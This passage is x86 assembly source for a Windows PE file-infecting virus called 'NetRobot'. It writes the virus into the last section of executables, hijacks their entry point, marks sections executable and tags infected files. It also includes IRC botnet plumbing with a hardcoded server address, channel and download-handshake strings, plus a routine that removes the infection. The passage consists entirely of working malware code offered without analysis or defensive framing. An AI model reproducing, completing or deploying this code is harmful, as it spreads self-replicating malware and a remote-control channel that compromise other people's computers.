	jz deinstall_exception_handler_without_closing
	mov esi, file_base[ebp]
	mov ebx, [esi + 3ch]
	add ebx, esi
	call find_last_section
	jne deinstall_exception_handler
	; append virus code to the last section
	mov edi, esi
	add edi, [edx + 20]
	lea esi, entry_point[ebp]
	add edi, [edx + 16]
	mov ecx, (VIRUS_CODE_SIZE / 4)
	push edi
	rep movsd
	mov cl, (VIRUS_CODE_SIZE - (VIRUS_CODE_SIZE / 4 * 4))
	jecxz virus_code_written
	rep movsb
virus_code_written:
	pop edi
	; crypt initialized data block
	push edx
	rdtsc
	xchg eax, edx
	lea eax, [edi + (initialized_data_block - entry_point)]
	mov [eax - 1], dl
	call crypt_data
	pop edx
	; change entry point
	mov ecx, [edx + 12]
	jecxz deinstall_exception_handler
	mov eax, offset entry_point
	add ecx, [edx + 16]		; ECX = new entry point
	add eax, [ebx + 28h]	; AddressOfEntryPoint
	sub eax, ecx
	mov [edi + (ENTRY_POINT_DELTA - entry_point)], eax
	mov [ebx + 28h], ecx
	; update PE structure
	mov eax, file_increase[ebp]
	add [edx + 16], eax		; SizeOfRawData
	add [ebx + 50h], eax	; SizeOfImage
	mov eax, virtual_increase[ebp]
	mov ecx, [edx + 16]
	add [edx + 8], eax		; VirtualSize
	.if [edx + 8] < ecx
		push ecx
		pop dword ptr [edx + 8]
	.endif
	or dword ptr [edx + 36], 0e0000000h		; IMAGE_READ_WRITE_EXECUTE
	mov dword ptr [ebx + 58h], 'RTEN'	; set up CheckSum (virus signature)
	call virus_get_version
	mov dword ptr [ebx + 4ch], eax		; save virus version
infection_complete:
	mov infector_result[ebp], 1
deinstall_exception_handler:
	call unmap_and_close_file
deinstall_exception_handler_without_closing:
	xor edx, edx
	mov esp, fs:[edx]
	pop dword ptr fs:[edx]
	pop eax
exit_infect_file:
	dec infector_busy[ebp]
	mov eax, infector_result[ebp]
	ret
infection_exception:
	call restore_context
	jmp deinstall_exception_handler

do_deinfect_file:
	.if infector_busy[ebp] > 0
		mov eax, -2
		ret
	.endif
	inc infector_busy[ebp]
	mov infector_result[ebp], 0
	mov file_name[ebp], eax
	; open file for deinfection
	xor ebx, ebx
	call open_and_map_file
	jz exit_infect_file
	dec infector_result[ebp]
	; install exception handler
	lea eax, infection_exception[ebp]
	xor edx, edx
	push eax
	push dword ptr fs:[edx]
	mov fs:[edx], esp
	; check if the file is infected
	mov esi, file_base[ebp]
	cmp word ptr [esi], 'ZM'
	jne deinstall_exception_handler
	mov ebx, [esi + 3ch]
	add ebx, esi
	cmp dword ptr [ebx], 'EP'
	jne deinstall_exception_handler
	test dword ptr [ebx + 16h], 2000h
	jnz deinstall_exception_handler
	cmp dword ptr [ebx + 58h], 'RTEN'
	jne deinstall_exception_handler
	call virus_get_version
	cmp dword ptr [ebx + 4ch], eax
	jne deinstall_exception_handler
	call calculate_increase
	call find_last_section
	jne deinstall_exception_handler
	inc infector_result[ebp]
	; restore PE structure
	mov edi, [edx + 20]		; PointerToRawData
	mov ecx, file_increase[ebp]
	add edi, [edx + 16]		; SizeOfRawData
	sub [ebx + 50h], ecx	; decrease SizeOfImage
	sub edi, ecx
	mov eax, [esi + edi + (ENTRY_POINT_DELTA - entry_point)]
	sub eax, offset entry_point
	add eax, [edx + 12]
	add eax, [edx + 16]
	sub eax, ecx
	sub [edx + 16], ecx		; truncate last section in file
	mov [ebx + 28h], eax	; restore original entry point
	mov edi, virtual_increase[ebp]
	xor esi, esi
	sub [edx + 8], edi		; truncate last section in memory
	mov [ebx + 58h], esi	; reset infection mark
	mov [ebx + 4ch], esi
	; truncate the file
	neg ecx
	push 2	; FILE_END
	push 0
	push ecx
	push dword ptr file_handle[ebp]
	call dword ptr SetFilePointer[ebp]
	cmp eax, -1
	je infection_complete
	mov file_size[ebp], 0
	jmp infection_complete

; deinfects a PE executable
; input:
;   EAX = pointer to ASCIIZ string with file path
; output:
;   EAX = 1 if the file has been successfully deinfected,
;         0 if an error has occured,
;         -1 if the file is not infected with this version of NetRobot,
;         -2 try again (infector busy)
; registers destroyed: EAX ECX EDX
deinfect_file:
	push ebp
	push esi
	push edi
	push ebx
	CHECK_DELTA ebp
	call do_deinfect_file
	pop ebx
	pop edi
	pop esi
	pop ebp
	ret

; changes internal auto-infection lock counter
; input:
;   EAX = modification delta
; output:
;   EAX = new counter value
; registers destroyed: EDX
lock_infector:
	CHECK_DELTA edx
	add lock_count[edx], eax
	mov eax, lock_count[edx]
	ret

; deinstalls virus from memory
; input: none
; output: none
; registers destroyed: EAX ECX EDX
shutdown_virus:
	push ebp
	CHECK_DELTA ebp
	lea eax, uninstaller_thread[ebp]
	call create_kernel_thread
wait_for_deinstall_complete:
	cmp initialized[ebp], 0
	je deinstall_complete
	push 10
	call dword ptr Sleep[ebp]
	jmp wait_for_deinstall_complete
deinstall_complete:
	pop ebp
	ret

; installs IRC hook function
; input:
;   EAX = function entry point
; output:
;   EAX = old hook function
; registers destroyed: EDX
install_irc_hook:
	CHECK_DELTA edx
	xchg eax, irc_hook[edx]
	ret

; retrieves IRC socket
; input: none
; output:
;   EAX = IRC socket
; registers destroyed: EDX
get_irc_socket:
	CHECK_DELTA edx
	mov eax, irc_socket[edx]
	ret

; returns IRC client nickname
; input: none
; output:
;   EAX = pointer to nickname
; registers destroyed: EDX
get_nick:
	CHECK_DELTA edx
	lea eax, my_nick[edx]
	ret

; returns address of LF-ended IRC channel name
; input: none
; output:
;   EAX = pointer to channel name
; registers destroyed: EDX
get_channel:
	CHECK_DELTA edx
	lea eax, irc_channel[edx]
	ret

virus_exports_list dd offset virus_get_version, offset create_kernel_thread
                   dd offset infect_file, offset lock_infector, offset shutdown_virus
                   dd offset install_irc_hook, offset get_irc_socket, offset get_nick
                   dd offset get_channel, offset deinfect_file
NUMBER_OF_EXPORTS = (($ - offset virus_exports_list) / 4)

N_VirtualAlloc db 'VirtualAlloc', 0
encryption_key db 0

initialized_data_block:

WinSock db 'WSOCK32', 0
irc_server db 217,17,33,10
m_user db 'USER '
m_user2 db ' . . :'
m_nick db 'NICK '
m_join db 'JOIN '
irc_channel db '#NetRobot', 10
JOIN_LENGTH = ($ - m_join)
http_handshake db ' HTTP/1.0', 13, 10, 'Host: '
HTTP_HANDSHAKE_LENGTH = ($ - http_handshake)
download_failed db 'NOTICE #NetRobot Error', 10
DOWNLOAD_FAILED_LENGTH = ($ - download_failed)
first_kernel_import_name:
db 'LoadLibraryA', 0
db 'CreateThread', 0
db 'Sleep', 0
db 'GetSystemTime', 0
db 'GetTempPathA', 0
db 'GetTempFileNameA', 0
db 'CreateFileA', 0
db 'CloseHandle', 0
db 'CreateProcessA', 0
db 'WriteFile', 0
db 'TerminateThread', 0
db 'SetFileAttributesA', 0
db 'GetFileAttributesA', 0
db 'GetFileTime', 0
db 'SetFileTime', 0
db 'CreateFileMappingA', 0
db 'MapViewOfFile', 0
db 'UnmapViewOfFile', 0
db 'GetFileSize', 0
db 'SetEndOfFile', 0
db 'SetFilePointer', 0
first_winsock_import_name:
db 'WSAStartup', 0
db 'gethostname', 0
db 'gethostbyname', 0
db 'connect', 0
db 'socket', 0
db 'recv', 0
db 'send', 0
db 'closesocket', 0
db 'ioctlsocket', 0

INITIALIZED_DATA_SIZE = ($ - offset initialized_data_block)
VIRUS_CODE_SIZE = ($ - offset entry_point)

initialized db ?
GetProcAddress dd ?
VxDCall4 dd ?
lock_count dd ?
old_VxDCall_int30_callback dw ?, ?, ?
VxDCall_int30_call_address dd ?
infector_busy db ?
local_host db 64 dup(?)
irc_socket dd ?
RandSeed dd ?
my_nick dd ?, ?
virus_thread_handle dd ?
irc_hook dd ?
file_attributes dd ?
file_handle dd ?
file_last_access_time dd ?, ?
file_last_write_time dd ?, ?
file_mapping_handle dd ?
file_base dd ?
file_name dd ?
infector_result dd ?
section_increase dd ?
virtual_increase dd ?
file_increase dd ?
file_size dd ?
file_name_buffer db 261 dup(?)

first_kernel_import_address:
LoadLibraryA dd ?
CreateThread dd ?
Sleep dd ?
GetSystemTime dd ?
GetTempPathA dd ?
GetTempFileNameA dd ?
CreateFileA dd ?
CloseHandle dd ?
CreateProcessA dd ?
WriteFile dd ?
TerminateThread dd ?
SetFileAttributesA dd ?
GetFileAttributesA dd ?
GetFileTime dd ?
SetFileTime dd ?
CreateFileMappingA dd ?
MapViewOfFile dd ?
UnmapViewOfFile dd ?
GetFileSize dd ?
SetEndOfFile dd ?
SetFilePointer dd ?
NUMBER_OF_KERNEL_IMPORTS = (($ - offset first_kernel_import_address) / 4)
first_winsock_import_address:
WSAStartup dd ?
gethostname dd ?
gethostbyname dd ?
connect dd ?
socket dd ?
recv dd ?
send dd ?
closesocket dd ?
ioctlsocket dd ?
NUMBER_OF_WINSOCK_IMPORTS = (($ - offset first_winsock_import_address) / 4)

VIRUS_TOTAL_SIZE = ($ - offset entry_point)

; at least one KERNEL32.DLL function must be imported...
ExitProcess PROTO :DWORD
invoke ExitProcess, 0

end entry_point
